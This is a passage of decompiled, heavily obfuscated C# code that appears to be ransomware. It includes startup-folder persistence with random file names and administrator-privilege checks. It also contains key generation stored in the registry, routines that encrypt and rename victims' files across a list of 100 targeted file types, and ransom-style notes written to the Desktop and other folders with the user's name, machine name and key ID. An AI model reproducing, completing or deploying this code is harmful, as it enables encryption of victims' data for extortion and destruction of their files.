										jDHUSaghZQjW(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
									}
								}
								catch (Exception ex2)
								{
									if (hIFJbdEMJudY)
									{
										try
										{
											File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107386050) + ex2.Message + getString_0(107395833));
										}
										catch (Exception)
										{
										}
									}
									gmdqiJfLiKSG++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!wRVzxmISkhBzKR)
						{
							if (!MFCrMNyVwftIF)
							{
								nQqNAlsrsLR(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107386059), cjnjoiIOwY);
							}
							else
							{
								nQqNAlsrsLR(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107386059), Convert.FromBase64String(kEFVKbULbQeU));
							}
						}
						else
						{
							try
							{
								if (!MFCrMNyVwftIF)
								{
									jDHUSaghZQjW(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
								}
								else
								{
									jDHUSaghZQjW(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
								}
							}
							catch (Exception ex2)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + getString_0(107386050) + ex2.Message + getString_0(107395833));
									}
									catch (Exception)
									{
									}
								}
								gmdqiJfLiKSG++;
								return;
							}
						}
						if (MFCrMNyVwftIF)
						{
							if (UfgTUBLEANxCD != getString_0(107386064))
							{
								kwCznOOXZRpq(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + UfgTUBLEANxCD, bytes);
							}
							else
							{
								kwCznOOXZRpq(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, bytes);
							}
						}
					}
					end_IL_032d:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ae4;
			IL_0ae4:
			XZRDbtNRlUBUa.Remove(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
		}

		static HbGtZiKmUw()
		{
			Strings.CreateGetStringDelegate(typeof(HbGtZiKmUw));
		}
	}

	private sealed class YzHiiJFmHgXJX
	{
		public string dFiPRFTAZdSvgLc;

		public string VBXkXxUgmNJw;

		public void _003CEncrypt2_003Eb__48()
		{
			while (true)
			{
				try
				{
					File.Delete(dFiPRFTAZdSvgLc);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__49()
		{
			while (true)
			{
				try
				{
					if (File.Exists(VBXkXxUgmNJw))
					{
						File.Delete(VBXkXxUgmNJw);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string AgnlixIASzPo;

	public static byte[] cjnjoiIOwY;

	public static string oLUeHhoXSrXL;

	public static string rqLFEsCDTMyF;

	public static List<string> qyAhWYLrtiOtS;

	public static List<string> ZptgORKOFpXG;

	public static string UyxzMyCitXGF;

	public static string kEFVKbULbQeU;

	public static string HZePHYGbpexu;

	public static string jdzEbvPutazU;

	public static string ZRDcpXUTjf;

	public static int mChCVJySpU;

	public static string mdbUrlsnzSwt;

	public static string WLuIVsIaUhiu;

	public static string HCpNwQtDwzNYscU;

	public static string GGlQFQXWCSTMex;

	public static string JEhiYMEqiJZdM;

	public static string IgkMrPNdoY;

	public static string NCTXVCAZAjOmyja;

	public static string xZEDYYkzZNtnw;

	public static List<string> LhumsKBCnHATf;

	public static List<string> rEUVMKgscr;

	public static string oMdDoqdvvo;

	public static string VIQnoauQMXDbY;

	public static string GMXxpLBEnImyJ;

	public static List<string> lBBLtRfPsPV;

	public static string MNBzqiuQfRJQcYj;

	private static string XgJEKIOOydLD;

	public static string mWfsjXfVaDjgsa;

	public static string ncZxFsAKDqAUKI;

	public static List<string> ChiDTlAoGQMI;

	public static List<string> qCvAdJfngnF;

	public static List<string> bruHyzeehnYYe;

	public static string ApqYNCacJvgq;

	public static List<string> hYLuEtEuxHyq;

	public static List<string> GYrkTbkHmlHWMo;

	public static string ZEmVnICIbBRUZQ;

	public static string UgaPTwgoRjIJ;

	internal static DateTime dcWTdhUfGduYB;

	internal static DateTime pIlCbMiwoka;

	public static string ZTtOBFIFhDPJ;

	public static string ybUSgcGwjKebC;

	public static string bfLHAxJfKaXqSS;

	public static string HOpZOfKRSkqrQ;

	public static string dzHgpDGlGW;

	public static string bMxANrWiPUcalcb;

	public static string NkvCSDGHDZ;

	public static string CMdYdSoRLCrMajhb;

	public static List<string> hHDzREQRrQkqjKe;

	public static string TQwKQbvIHjGUX;

	public static string wlgCZFnHvCei;

	public static string SGWNbaKnmA;

	public static string LMpNgFGShlT;

	public static string TTbEbSgDAnnJ;

	public static string FalYYrscvz;

	public static string vEIuBeySmAexSb;

	public static string wvVqxnBdrKxaCFZ;

	public static string kvwQzPxIqIlk;

	public static string VyRGExDcVMKv;

	public static string DsHDKKZPqyRV;

	public static string cldkFsbciuo;

	public static string jJkNZEReBTMkuY;

	public static string HVmQpJlElf;

	public static string oTOnJctkwlomjyOZ;

	public static string eRcopzfggFE;

	public static string TUGYFpvgdQx;

	public static string eKzyHsWGljk;

	public static string KMWeqbAyUYuGHH;

	public static string rwyuADDQdblNA;

	public static string OCCDMTBKtUqAz;

	public static string rWgzoQLgIQfGZ;

	public static string YWANRiRWiwxS;

	public static string ZOYchrvgjtkVKhh;

	public static string PvAuHyHwFZ;

	public static string IRCSlCXoMRFG;

	public static string iHEcKVZxNihtAo;

	public static string fFgPwmFliHHKe;

	public static string pdVkOWqmIAKIO;

	public static string[] yWgWMeznrQnK;

	public static string kcgyNtrPsiyuwV;

	public static bool OIyyeuNoRzhHTwe;

	public static string DMbGhzJPCMTj;

	public static bool MFCrMNyVwftIF;

	public static bool ryIZnDiEOid;

	public static bool EekjbAOphgGS;

	public static bool EMUmjShvoRjVxRTfB;

	public static string LImNkSPhwOOQHW;

	public static bool hIFJbdEMJudY;

	public static bool uJePXmmfyrV;

	public static bool QNcazMBOlHTTBH;

	public static bool WRwAKzNShnoL;

	public static bool wRVzxmISkhBzKR;

	public static string mqQgvSYgrlnpSvAge;

	public static bool qqVKUcwYqRObMU;

	public static Stopwatch UNPGQjVMpE;

	public static int gmdqiJfLiKSG;

	public static int DnHtYVwZFeaR;

	public static bool eSjMTjCatON;

	public static string BBDxmQurRdVswG;

	public static string[] CCiaOWbaRz;

	public static List<string> yDNKtVeuKTBPdF;

	public static int bcPffxszCs;

	public static bool DHzgvUPuaGcJ;

	public static bool ShkWUIXYoOWB;

	public static bool AbzhPXXcXCCr;

	public static bool fiNlreSRwIMD;

	public static bool IeiMhxonCbw;

	public static bool kXcVqGPhsGu;

	public static List<string> LprhUPIkKugxdZ;

	public static string fOCEhEMJTPme;

	public static bool CuCRTFRskQOdHM;

	public static List<string> JPkRLvIGNCy;

	public static List<string> WisYbFelSli;

	public static List<string> qbJtaXaxLuUIqG;

	public static byte[] FfXSrTItXwhd;

	public static byte[] VfmZCqDrTnYlT;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate18;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate19;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate20;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		try
		{
			TubnkBsxwwr CS_0024_003C_003E8__locals0 = new TubnkBsxwwr();
			CS_0024_003C_003E8__locals0.IpRGqFaYhWFXiZxQ = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.IpRGqFaYhWFXiZxQ) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			ybWyoPdnGJbKY.bDmxSihMJNZVNi(XgJEKIOOydLD);
		}
		catch (Exception)
		{
		}
		try
		{
			if (IRCSlCXoMRFG == getString_0(107396866))
			{
				Thread thread = new Thread(HPjmSzaItgc.xpqFWVCugj);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (HCpNwQtDwzNYscU == getString_0(107396866))
		{
			Thread.Sleep(int.Parse(GGlQFQXWCSTMex));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && NkvCSDGHDZ == getString_0(107396866))
		{
			try
			{
				KpWrBwnRJp(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107396893))));
			}
			catch
			{
			}
		}
		try
		{
			if (NCTXVCAZAjOmyja == getString_0(107396866) && aslsneZLzuvnC.hOpynmqlhFl())
			{
				new JYKnpONXnNTAKuf().LqUvfhkEkjw(bool_0: false);
				aslsneZLzuvnC.jDRSYLKRopf();
			}
		}
		catch (Exception)
		{
		}
		if (VIQnoauQMXDbY == getString_0(107396866) && aslsneZLzuvnC.hOpynmqlhFl())
		{
			new JYKnpONXnNTAKuf().LqUvfhkEkjw(bool_0: false);
			new JYKnpONXnNTAKuf().EVAfyPclgzaSGUc();
		}
		if (WLuIVsIaUhiu == getString_0(107396866))
		{
			UgviHNAekjr.POviaAFWsFhjalZ();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396788);
			string text2 = text + Path.GetFileName(fileName);
			if (ZRDcpXUTjf == getString_0(107396866) && fileName != text2)
			{
				Thread thread2 = new Thread(enSfSFSRotFC);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (UyxzMyCitXGF == getString_0(107396866) && mainModule != null && fileName != text2)
			{
				try
				{
					mChCVJySpU = cSdKRvqchGCRk(0, LhumsKBCnHATf.Count);
					File.Copy(fileName, text + LhumsKBCnHATf[mChCVJySpU], overwrite: true);
					getString_0(107396783);
					Process.Start(text + LhumsKBCnHATf[mChCVJySpU]);
					kAlCBmYCeKnIaP();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (ZEmVnICIbBRUZQ == getString_0(107396866) && DateTime.Now < dcWTdhUfGduYB)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (UgaPTwgoRjIJ == getString_0(107396866) && DateTime.Now > pIlCbMiwoka)
			{
				kAlCBmYCeKnIaP();
			}
		}
		catch
		{
		}
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate
			{
				List<string> chiDTlAoGQMI = ChiDTlAoGQMI;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386433)), string_0);
					};
				}
				Parallel.ForEach(chiDTlAoGQMI, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				List<string> source3 = qCvAdJfngnF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386452)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				if (pdVkOWqmIAKIO == getString_0(107396866))
				{
					string[] source4 = yWgWMeznrQnK;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
						{
							hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386452)), getString_0(107386427) + string_0 + getString_0(107386418));
						};
					}
					Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				if (!pIFGXSXFivCGoDR().Contains(getString_0(107388604)))
				{
					try
					{
						tYjyeLOdohO(ApqYNCacJvgq);
					}
					catch (Exception)
					{
					}
					List<string> source5 = bruHyzeehnYYe;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
						{
							hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
						};
					}
					Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
				}
				else
				{
					List<string> source6 = bruHyzeehnYYe;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
						{
							hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
						};
					}
					Parallel.ForEach(source6, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
				}
				List<string> source7 = hYLuEtEuxHyq;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
					{
						hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107386381)), string_0);
					};
				}
				Parallel.ForEach(source7, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			if (!qyAhWYLrtiOtS.Contains(currentDirectory))
			{
				qyAhWYLrtiOtS.Add(currentDirectory);
			}
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396465))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396465)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396416)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !qyAhWYLrtiOtS.Contains(text6) && text6 != getString_0(107396395) && text6 != getString_0(107396406) && text6 != getString_0(107396353))
								{
									qyAhWYLrtiOtS.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396324)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && text6 != getString_0(107396395) && text6 != getString_0(107396406) && text6 != getString_0(107396353))
								{
									LprhUPIkKugxdZ.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396335)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396290))
						{
							jJkNZEReBTMkuY = getString_0(107396866);
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396313))
						{
							jJkNZEReBTMkuY = getString_0(107396304);
						}
					}
					if (text3.Contains(getString_0(107396267)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396290))
						{
							qqVKUcwYqRObMU = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396313))
						{
							qqVKUcwYqRObMU = false;
						}
					}
					if (text3.Contains(getString_0(107396282)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396290))
						{
							hIFJbdEMJudY = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396313))
						{
							hIFJbdEMJudY = false;
						}
					}
					if (text3.Contains(getString_0(107396237)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396290))
						{
							DHzgvUPuaGcJ = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396313))
						{
							DHzgvUPuaGcJ = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107396240) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (jJkNZEReBTMkuY == getString_0(107396304))
		{
			DRxOrUGwGniccexBp();
		}
		if (ShkWUIXYoOWB)
		{
			try
			{
				Console.WriteLine(getString_0(107396675));
				jswVoEfsIYZT.cfDSiMohTNM();
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107396622) + ex6.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (jJkNZEReBTMkuY == getString_0(107396866))
		{
			try
			{
				vOyJYdfWugZWj();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && EekjbAOphgGS)
			{
				try
				{
					Thread thread4 = new Thread(NFfXdvdfDuMJc.OXBNPpJpRsmmn);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			hsDlrZQtGPkuWD(getString_0(107396577), khBNqVxVYaM(getString_0(107396596)));
		}
		if (oMdDoqdvvo == getString_0(107396866) && QeIEovdzTICF() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(zBiFvXBiIzopyL.iOKnjOxhgppnTr);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		if (!(ncZxFsAKDqAUKI == getString_0(107396866)))
		{
		}
		SecureString secureString = new SecureString();
		if (bfLHAxJfKaXqSS == getString_0(107396304))
		{
			if (!CuCRTFRskQOdHM)
			{
				kEFVKbULbQeU = NsWnhWGrDevK.XYGURAYlyql(32);
				HZePHYGbpexu = NsWnhWGrDevK.rkNAREnSFDNs();
			}
		}
		else
		{
			kEFVKbULbQeU = getString_0(107396491);
		}
		if (!CuCRTFRskQOdHM)
		{
			jdzEbvPutazU = UYysiahIon.OmdRenOSNRu(kEFVKbULbQeU + HZePHYGbpexu);
		}
		else
		{
			try
			{
				CRArfjwFRvgmOa();
				kEFVKbULbQeU = UJYexohujGO(VORYuwjbhiJq(VfmZCqDrTnYlT, GhLmriLVJtiPXg(fOCEhEMJTPme)));
				VfmZCqDrTnYlT = null;
				HZePHYGbpexu = UJYexohujGO(new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
				jdzEbvPutazU = UJYexohujGO(FfXSrTItXwhd);
			}
			catch (Exception)
			{
				CuCRTFRskQOdHM = false;
				kEFVKbULbQeU = NsWnhWGrDevK.XYGURAYlyql(32);
				HZePHYGbpexu = NsWnhWGrDevK.rkNAREnSFDNs();
				jdzEbvPutazU = UYysiahIon.OmdRenOSNRu(kEFVKbULbQeU + HZePHYGbpexu);
			}
		}
		try
		{
			if (!MFCrMNyVwftIF)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(khBNqVxVYaM(getString_0(107395966)));
				if (registryKey != null)
				{
					registryKey.SetValue(khBNqVxVYaM(getString_0(107395921)) + (registryKey.ValueCount + 1), jdzEbvPutazU);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(khBNqVxVYaM(getString_0(107395966)));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(khBNqVxVYaM(getString_0(107395921)) + (registryKey.ValueCount + 1), jdzEbvPutazU);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			IeiMhxonCbw = true;
		}
		if (wvVqxnBdrKxaCFZ == getString_0(107396866))
		{
			laibAxkrcZqT();
		}
		if (QNcazMBOlHTTBH)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), mqQgvSYgrlnpSvAge)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), mqQgvSYgrlnpSvAge), string.Concat(khBNqVxVYaM(getString_0(107395880)), new WebClient().DownloadString(khBNqVxVYaM(getString_0(107395887))), getString_0(107395814), khBNqVxVYaM(getString_0(107395809)), DateTime.Now, getString_0(107395814), khBNqVxVYaM(getString_0(107395800)), jdzEbvPutazU));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), mqQgvSYgrlnpSvAge), getString_0(107395711) + jdzEbvPutazU);
				}
			}
			catch (Exception ex12)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107396194) + ex12.Message + getString_0(107395814));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!fiNlreSRwIMD || IeiMhxonCbw)
		{
			wqTwhxeRSMAULyq(jdzEbvPutazU);
		}
		try
		{
			try
			{
				if (qqVKUcwYqRObMU)
				{
					Console.WriteLine(getString_0(107396177));
				}
			}
			catch
			{
			}
			snnMPiNHEe(new string[1] { getString_0(107396096) }, new string[100]
			{
				getString_0(107396119),
				getString_0(107396114),
				getString_0(107396077),
				getString_0(107396068),
				getString_0(107396063),
				getString_0(107396090),
				getString_0(107396085),
				getString_0(107396080),
				getString_0(107396043),
				getString_0(107396038),
				getString_0(107396033),
				getString_0(107396060),
				getString_0(107396051),
				getString_0(107396014),
				getString_0(107396005),
				getString_0(107396000),
				getString_0(107396027),
				getString_0(107396022),
				getString_0(107396017),
				getString_0(107395980),
				getString_0(107395971),
				getString_0(107395998),
				getString_0(107395993),
				getString_0(107395988),
				getString_0(107395983),
				getString_0(107395434),
				getString_0(107395429),
				getString_0(107395424),
				getString_0(107395451),
				getString_0(107395446),
				getString_0(107395441),
				getString_0(107395404),
				getString_0(107395399),
				getString_0(107395394),
				getString_0(107395417),
				getString_0(107395412),
				getString_0(107395407),
				getString_0(107395370),
				getString_0(107396085),
				getString_0(107395365),
				getString_0(107396043),
				getString_0(107395388),
				getString_0(107395383),
				getString_0(107395378),
				getString_0(107395341),
				getString_0(107395336),
				getString_0(107395331),
				getString_0(107395358),
				getString_0(107395353),
				getString_0(107395348),
				getString_0(107395343),
				getString_0(107395306),
				getString_0(107395301),
				getString_0(107395296),
				getString_0(107395323),
				getString_0(107395318),
				getString_0(107395313),
				getString_0(107395276),
				getString_0(107395267),
				getString_0(107395294),
				getString_0(107395285),
				getString_0(107395240),
				getString_0(107395365),
				getString_0(107395259),
				getString_0(107395250),
				getString_0(107395209),
				getString_0(107395200),
				getString_0(107395223),
				getString_0(107395694),
				getString_0(107395689),
				getString_0(107395680),
				getString_0(107395703),
				getString_0(107395662),
				getString_0(107395657),
				getString_0(107395652),
				getString_0(107395647),
				getString_0(107395674),
				getString_0(107395669),
				getString_0(107395664),
				getString_0(107395623),
				getString_0(107395618),
				getString_0(107395645),
				getString_0(107395640),
				getString_0(107395635),
				getString_0(107395598),
				getString_0(107395589),
				getString_0(107395612),
				getString_0(107395607),
				getString_0(107395399),
				getString_0(107395602),
				getString_0(107395565),
				getString_0(107395560),
				getString_0(107395555),
				getString_0(107395582),
				getString_0(107395573),
				getString_0(107395568),
				getString_0(107395531),
				getString_0(107395522),
				getString_0(107395549),
				getString_0(107395544)
			}, new string[0], kEFVKbULbQeU, getString_0(107395539));
		}
		catch (Exception ex6)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107395494) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!fiNlreSRwIMD || IeiMhxonCbw)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469));
					streamWriter.WriteLine(khBNqVxVYaM(getString_0(107394924)).Replace(getString_0(107389722), YarXNhsRIUck.FgehTUZSzpVn()).Replace(getString_0(107389713), Environment.UserName).Replace(getString_0(107389664), Environment.MachineName)
						.Replace(getString_0(107389643), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395814));
					if (AbzhPXXcXCCr || !MFCrMNyVwftIF)
					{
						streamWriter.WriteLine(khBNqVxVYaM(getString_0(107389658)));
						streamWriter.WriteLine(jdzEbvPutazU);
					}
					if (mWfsjXfVaDjgsa == getString_0(107396304))
					{
						streamWriter.WriteLine(getString_0(107395814));
						streamWriter.WriteLine(khBNqVxVYaM(getString_0(107389609)) + Convert.ToString(lBBLtRfPsPV.Count));
					}
					if (eSjMTjCatON)
					{
						streamWriter.WriteLine(getString_0(107395814));
						streamWriter.WriteLine(khBNqVxVYaM(getString_0(107390076)));
						streamWriter.WriteLine(YarXNhsRIUck.FgehTUZSzpVn());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469));
					if (!text7.Contains(jdzEbvPutazU) && !MFCrMNyVwftIF)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469), getString_0(107390043) + jdzEbvPutazU);
					}
				}
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107390014) + ex6.Message + getString_0(107395814));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in rEUVMKgscr)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + getString_0(107395469)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469), item + getString_0(107395469), overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469));
						if (!text7.Contains(jdzEbvPutazU) && !MFCrMNyVwftIF)
						{
							File.AppendAllText(item + getString_0(107395469), getString_0(107390043) + jdzEbvPutazU);
						}
					}
				}
				catch (Exception ex6)
				{
					if (hIFJbdEMJudY)
					{
						try
						{
							File.AppendAllText(LImNkSPhwOOQHW, getString_0(107390014) + ex6.Message + getString_0(107395814));
						}
						catch (Exception)
						{
						}
					}
					num--;
				}
				if (!EMUmjShvoRjVxRTfB && num > 10)
				{
					break;
				}
			}
		}
		if ((YWANRiRWiwxS == getString_0(107396866) && !fiNlreSRwIMD) || (YWANRiRWiwxS == getString_0(107396866) && IeiMhxonCbw))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389969)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389969));
					streamWriter.WriteLine(khBNqVxVYaM(getString_0(107389936)).Replace(getString_0(107389722), YarXNhsRIUck.FgehTUZSzpVn()).Replace(getString_0(107389713), Environment.UserName).Replace(getString_0(107389664), Environment.MachineName)
						.Replace(getString_0(107389643), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395814));
					if (AbzhPXXcXCCr || !MFCrMNyVwftIF)
					{
						streamWriter.WriteLine(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107389887))));
						streamWriter.WriteLine(jdzEbvPutazU + khBNqVxVYaM(getString_0(107389846)));
					}
					if (mWfsjXfVaDjgsa == getString_0(107396304))
					{
						streamWriter.WriteLine(getString_0(107395814));
